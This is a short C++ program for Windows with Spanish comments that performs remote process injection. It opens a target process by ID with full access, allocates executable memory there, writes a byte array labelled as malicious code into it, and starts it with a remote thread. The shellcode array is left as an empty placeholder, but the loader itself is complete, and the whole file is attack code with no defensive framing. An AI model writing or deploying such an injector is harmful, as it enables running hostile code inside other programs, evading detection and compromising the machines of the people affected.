#include <iostream>
#include <Windows.h>

int main()
{
    // Obtener el identificador
    DWORD targetProcessId = 1234; // ID del proceso

    // Abrir el proceso
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetProcessId);
    if (hProcess == NULL)
    {
        std::cout << "No se pudo abrir el proceso" << std::endl;
        return 1;
    }

    // Reservar memoria en el proceso
    LPVOID remoteMemory = VirtualAllocEx(hProcess, NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (remoteMemory == NULL)
    {
        std::cout << "No se pudo asignar memoria" << std::endl;
        CloseHandle(hProcess);
        return 1;
    }

    // Código aquí
    BYTE maliciousCode[] = { /* shellcode */ };

    // Inyectar el bisho en la memoria
    SIZE_T bytesWritten;
    BOOL writeResult = WriteProcessMemory(hProcess, remoteMemory, maliciousCode, sizeof(maliciousCode), &bytesWritten);
    if (!writeResult || bytesWritten != sizeof(maliciousCode))
    {
        std::cout << "No se pudo escribir el código malicioso en la memoria del proceso objetivo." << std::endl;
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // Crear un hilo remoto para ejecutar el código malicioso
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMemory, NULL, 0, NULL);
    if (hThread == NULL)
    {
        std::cout << "No se pudo crear un hilo" << std::endl;
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    std::cout << "Inyección exitosa" << std::endl;

    // Esperar a que el hilo remoto termine de ejecutarse
    WaitForSingleObject(hThread, INFINITE);

    // Liberar recursos
    VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return 0;
}
